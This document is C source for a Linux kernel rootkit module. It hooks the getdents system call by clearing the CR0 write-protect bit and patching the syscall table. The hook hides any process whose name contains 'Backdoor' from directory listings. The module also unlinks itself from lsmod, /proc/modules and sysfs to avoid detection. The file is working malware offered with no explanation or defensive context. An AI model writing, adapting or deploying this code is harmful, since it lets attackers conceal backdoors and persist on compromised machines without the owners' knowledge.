#include <linux/module.h>
#include <linux/kernel.h>
#include <asm/unistd.h>
#include <linux/types.h>
#include <linux/sched.h>
#include <linux/dirent.h>
#include <linux/string.h>
#include <linux/file.h>
#include <linux/fs.h>
#include <linux/list.h>
#include <asm/uaccess.h>
#include <linux/unistd.h>
//#include <sys/stat.h>
//#include <fcntl.h>
#define CALLOFF 100


int orig_cr0;
//char psname[10]="test1";
char psname[10]="Backdoor";
char *processname=psname;

//module_param(processname, charp, 0);
struct {
    unsigned short limit;
    unsigned int base;
} __attribute__ ((packed)) idtr;

struct {
    unsigned short off1;
    unsigned short sel;
    unsigned char none,flags;
    unsigned short off2;
} __attribute__ ((packed)) * idt;

struct linux_dirent{
    unsigned long     d_ino;
    unsigned long     d_off;
    unsigned short    d_reclen;
    char    d_name[1];
};

void** sys_call_table;

unsigned int clear_and_return_cr0(void)
{
    unsigned int cr0 = 0;
    unsigned int ret;

    asm volatile ("movl %%cr0, %%eax"
            : "=a"(cr0)
         );
    ret = cr0;

    /*clear the 20th bit of CR0,*/
    cr0 &= 0xfffeffff;
    asm volatile ("movl %%eax, %%cr0"
            :
            : "a"(cr0)
         );
    return ret;
}

void setback_cr0(unsigned int val)
{
    asm volatile ("movl %%eax, %%cr0"
            :
            : "a"(val)
         );
}


asmlinkage long (*orig_getdents)(unsigned int fd,
                    struct linux_dirent __user *dirp, unsigned int count);

char * findoffset(char *start)
{
    char *p;
    for (p = start; p < start + CALLOFF; p++)
    if (*(p + 0) == '\xff' && *(p + 1) == '\x14' && *(p + 2) == '\x85')
        return p;
    return NULL;
}

int myatoi(char *str)
{
    int res = 0;
    int mul = 1;
    char *ptr;
    for (ptr = str + strlen(str) - 1; ptr >= str; ptr--)
    {
        if (*ptr < '0' || *ptr > '9')
            return (-1);
        res += (*ptr - '0') * mul;
        mul *= 10;
    }
    if(res>0 && res< 9999)
        printk(KERN_INFO "pid=%d,",res);
    printk("\n");
    return (res);
}

struct task_struct *get_task(pid_t pid)
{
    struct task_struct *p = get_current(),*entry=NULL;
    list_for_each_entry(entry,&(p->tasks),tasks)
    {
        if(entry->pid == pid)
        {
            printk("pid found=%d\n",entry->pid);
            return entry;
        }
        else
        {
    //    printk(KERN_INFO "pid=%d not found\n",pid);
        }
    }
    return NULL;
}

static inline char *get_name(struct task_struct *p, char *buf)
{
    int i;
    char *name;
    name = p->comm;
    i = sizeof(p->comm);
    do {
        unsigned char c = *name;
        name++;
        i--;
        *buf = c;
        if (!c)
            break;
        if (c == '\\') {
            buf[1] = c;
            buf += 2;
            continue;
        }
        if (c == '\n')
        {
            buf[0] = '\\';
            buf[1] = 'n';
            buf += 2;
            continue;
        }
        buf++;
    }
    while (i);
    *buf = '\n';
    return buf + 1;
}

int get_process(pid_t pid)
{
    struct task_struct *task = get_task(pid);
    //    char *buffer[64] = {0};
    char buffer[64];
    if (task)
    {
        get_name(task, buffer);
    //    if(pid>0 && pid<9999)
    //    printk(KERN_INFO "task name=%s\n",*buffer);
        if(strstr(buffer,processname))
            return 1;
        else
            return 0;
    }
    else
        return 0;
}

asmlinkage long hacked_getdents(unsigned int fd,
                    struct linux_dirent __user *dirp, unsigned int count)
{
    //added by lsc for process
    long value;
    //    struct inode *dinode;
    unsigned short len = 0;
    unsigned short tlen = 0;
//    struct linux_dirent *mydir = NULL;
//end
    value = (*orig_getdents) (fd, dirp, count);
    tlen = value;
    while(tlen > 0)
    {
        len = dirp->d_reclen;
        tlen = tlen - len;
        printk("%s\n",dirp->d_name);
                               
        if(get_process(myatoi(dirp->d_name)) )
        {
            printk("find process\n");
            memmove(dirp, (char *) dirp + dirp->d_reclen, tlen);
            value = value - len;
            printk(KERN_INFO "hide successful.\n");
        }
        else{
            if(tlen)
            dirp = (struct linux_dirent *) ((char *)dirp + dirp->d_reclen);
        }
    }
    printk(KERN_INFO "finished hacked_getdents.\n");
    return value;
}


void **get_sct_addr(void)
{
    unsigned sys_call_off;
    unsigned sct = 0;
    char *p;
    asm("sidt %0":"=m"(idtr));
    idt = (void *) (idtr.base + 8 * 0x80);
    sys_call_off = (idt->off2 << 16) | idt->off1;
    if ((p = findoffset((char *) sys_call_off)))
        sct = *(unsigned *) (p + 3);
    return ((void **)sct);
}

static inline void rootkit_hide(void)
{
    list_del(&THIS_MODULE->list);//lsmod,/proc/modules
    kobject_del(&THIS_MODULE->mkobj.kobj);// /sys/modules
    list_del(&THIS_MODULE->mkobj.kobj.entry);// kobj struct list_head entry
}

static int filter_init(void)
{
    sys_call_table = get_sct_addr();
    if (!sys_call_table)
    {
        printk("get_act_addr(): NULL...\n");
        return 0;
    }
    else
        printk("sct: 0x%x\n", (unsigned int)sys_call_table);
    orig_getdents = sys_call_table[__NR_getdents];
	printk("offset: 0x%x\n\n\n\n",orig_getdents);
    orig_cr0 = clear_and_return_cr0();
    sys_call_table[__NR_getdents] = hacked_getdents;
    setback_cr0(orig_cr0);
    rootkit_hide();
    printk(KERN_INFO "hideps: module loaded.\n");
                return 0;
}


static void filter_exit(void)
{
    orig_cr0 = clear_and_return_cr0();
    if (sys_call_table)
    sys_call_table[__NR_getdents] = orig_getdents;
    setback_cr0(orig_cr0);
    printk(KERN_INFO "hideps: module removed\n");
}
module_init(filter_init);
module_exit(filter_exit);
MODULE_LICENSE("GPL");
